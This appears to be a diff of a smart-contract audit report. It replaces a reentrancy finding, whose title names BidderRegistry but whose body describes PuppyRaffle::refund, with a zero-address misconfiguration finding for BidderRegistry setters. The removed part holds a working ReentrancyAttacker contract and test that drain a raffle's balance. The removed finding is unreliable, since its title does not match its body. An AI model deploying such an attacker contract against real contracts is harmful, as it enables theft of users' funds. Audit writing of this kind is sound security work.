@@ -1,122 +1,58 @@
-### [H] Reentrancy attack in `BidderRegistry::convertFundsToProviderReward` allows entrant to drain raffle balance
+### [S-1] Misconfiguration DoS via zero-address in critical setters (Root Cause: missing validation; Impact: protocol operations can be bricked)
 
-**Description:** The `BidderRegistry::convertFundsToProviderReward` function does not follow CEI (Checks, Effect, Interactions) and as a result, enables participants to drain the contract balance.
+**Description:**  
+`BidderRegistry.setDepositManagerImpl(address)` and `BidderRegistry.setPreconfManager(address)` accept arbitrary addresses with **no zero-address check**. These values are later relied on by access control / liveness checks:
 
-In the `PuppyRaffle::refund` function, we first make an external call to the `msg.sender` address and only after making that external call do we update the `PuppyRaffle::okayers` array
+- `openBid(...)` is gated by `depositManagerIsSet`, which reverts if `depositManagerImpl == address(0)`.  
+- Many privileged flows are gated by `onlyPreconfManager` (`convertFundsToProviderReward`, `unlockFunds`, `openBid` via caller expectations), which compares `msg.sender` to `preconfManager`.
 
-```javascript
-    function refund(uint256 playerIndex) public {
-        
-        address playerAddress = players[playerIndex];
-        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
-        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
-        
-       payable(msg.sender).sendValue(entranceFee);
-      players[playerIndex] = address(0);
+If the owner (or a compromised owner key / deployment script) sets either value to the zero address (or clears it during an upgrade/rollback), the registry becomes partially or totally unusable.
 
-        emit RaffleRefunded(playerAddress);
-    }
+**Impact:**  
+- **Hard DoS of bidding flow:** With `depositManagerImpl == address(0)`, every `openBid(...)` call reverts due to the `depositManagerIsSet` modifier, halting new bids and escrow accounting.  
+- **Settlement/Slashing DoS:** With `preconfManager == address(0)`, *all* functions guarded by `onlyPreconfManager` revert forever, blocking reward settlement (`convertFundsToProviderReward`) and unlocks on slash (`unlockFunds`). Funds can become stranded in escrow/accounting buckets.  
+- Severity: **Medium/High**, depending on admin model. A single misconfiguration bricks core functionality and can immobilize user funds until another privileged tx fixes it.
+
+**Proof of Concept:**  
+1) Owner (accidentally) calls:
+```solidity
+bidderRegistry.setDepositManagerImpl(address(0));
 ```
-
-A player who has entered the raffle could have a `fallback`/`receive` function that calls the `PuppyRaffle::refund` function again and claim  another refund. They could continue the cycle till the contract balance is drained.
-
-**Impact:** All fees paid by raffle entrants could be stolen by the malicious participant.
-
-**Proof of Code**
-
-<details>
-<summary>Code</summary>
-
-Place the following into `PuppyRaffleTest.t.sol`
-
-```javascript
-    function test_reentrancyRefund() public {
-        address[] memory players = new address[](4);
-        players[0] = playerOne;
-        players[1] = playerTwo;
-        players[2] = playerThree;
-        players[3] = playerFour;
-        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
-
-        ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);
-        address attackUser = makeAddr("attackerUser");
-        vm.deal(attackUser, 1 ether);
-
-        uint256 startingAttackContractBalance = address(attackerContract).balance;
-        uint256 startingContractBalance = address(puppyRaffle).balance;
-
-        //attackerContract
-        vm.prank(attackUser);
-        attackerContract.attack{value: entranceFee}();
-
-        console.log("starting attacker contract balance: ", startingAttackContractBalance);
-        console.log("starting contract balance: ", startingContractBalance);
-
-        console.log("ending attacker contract balance: ", address(attackerContract).balance);
-        console.log("ending contract balance: ", address(puppyRaffle).balance);
-
-    }
+2) Any subsequent call to:
+```solidity
+bidderRegistry.openBid(commitmentDigest, bidAmt, bidder, provider);
 ```
-
-And this contract as well.
-
-```javascript
-    contract ReentrancyAttacker {
-    PuppyRaffle puppyRaffle;
-    uint256 entranceFee;
-    uint256 attackerIndex;
-
-    constructor(PuppyRaffle _puppyRaffle) {
-        puppyRaffle = _puppyRaffle;
-        entranceFee = puppyRaffle.entranceFee();
-    }
-
-    function attack() external payable {
-        address[] memory players = new address[](1);
-        players[0] = address(this);
-        puppyRaffle.enterRaffle{value: entranceFee}(players);
-
-        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
-        puppyRaffle.refund(attackerIndex);
-    }
-
-    function _stealMoney() internal {
-        if (address(puppyRaffle).balance >= entranceFee) {
-            puppyRaffle.refund(attackerIndex);
-        }
-    }
-
-    receive() external payable {
-        _stealMoney();
-    }
-
-    fallback() external payable {
-        _stealMoney();
-    }
+reverts at the modifier:
+```solidity
+modifier depositManagerIsSet() {
+    require(depositManagerImpl != address(0), DepositManagerNotSet());
+    _;
 }
 ```
 
-</details>
-
-
-1. User enters the raffle
-2. Attacke sets up a contract with a `fallback` function that calls `PuppyRaffle::refund`
-3. Attacker enters the raffle
-4. Attacker calls `PuppyRaffle::refund` from their attack contract, draining the contract balance.
-
-**Recommended Mitigation:** To prevent this, we shoudl have the `PuppyRaffle:refund` function update the `players` array before making the external call. Additionally, we should move the event emission up as well.
-
-```diff
-    function refund(uint256 playerIndex) public {
-        
-        address playerAddress = players[playerIndex];
-        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
-        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
-+       players[playerIndex] = address(0);
-+       emit RaffleRefunded(playerAddress); 
-        payable(msg.sender).sendValue(entranceFee);
--       players[playerIndex] = address(0);
--       emit RaffleRefunded(playerAddress);
-    }
-
+Similarly, setting:
+```solidity
+bidderRegistry.setPreconfManager(address(0));
 ```
+causes every `onlyPreconfManager` function (e.g., `convertFundsToProviderReward`, `unlockFunds`) to revert because `msg.sender` can never equal `address(0)`.
+
+**Recommended Mitigation:**  
+- Add explicit zero-address validation and keep existing events:
+```solidity
+function setDepositManagerImpl(address _impl) external onlyOwner {
+    require(_impl != address(0), "DM impl zero");
+    depositManagerImpl = _impl;
+    depositManagerHash = keccak256(abi.encodePacked(hex"ef0100", _impl));
+    emit DepositManagerImplUpdated(_impl);
+}
+
+function setPreconfManager(address _preconf) external onlyOwner {
+    require(_preconf != address(0), "preconf zero");
+    preconfManager = _preconf;
+    emit PreconfManagerUpdated(_preconf);
+}
+```
+- Consider a **two-step admin pattern** for critical address changes:
+  1) `proposeX(address)` stores a pending value and emits an event.
+  2) `acceptX()` finalizes after a delay or a second confirmation.
+- Optionally add **pausing/escape hatches** so that, if a bad value is set, an authorized role can still unbrick the contract quickly.
